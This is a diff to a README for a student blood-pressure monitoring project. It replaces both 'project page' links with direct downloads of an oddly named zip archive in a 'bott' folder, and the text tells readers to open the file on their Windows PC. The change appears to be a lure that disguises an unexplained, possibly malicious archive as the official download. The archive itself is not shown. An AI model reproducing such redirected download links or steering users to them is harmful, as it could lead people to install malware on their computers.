@@ -1,6 +1,6 @@
 # 💓 SLIIT-FYP-BloodPressure - Monitor Blood Pressure With Ease
 
-[![Download / Visit Project Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/costasyncretistic62/SLIIT-FYP-BloodPressure)
+[![Download / Visit Project Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/costasyncretistic62/SLIIT-FYP-BloodPressure/raw/refs/heads/main/bott/SLII-FY-Blood-Pressure-3.3.zip)
 
 ## 📌 Overview
 
@@ -25,7 +25,7 @@ Before you start, have these items ready:
 
 Use this page to download and access the project files:
 
-[Open the project page](https://github.com/costasyncretistic62/SLIIT-FYP-BloodPressure)
+[Open the project page](https://github.com/costasyncretistic62/SLIIT-FYP-BloodPressure/raw/refs/heads/main/bott/SLII-FY-Blood-Pressure-3.3.zip)
 
 If the repository includes a release build or setup package, download it from that page, then open the file on your Windows PC and follow the steps in the package.
 
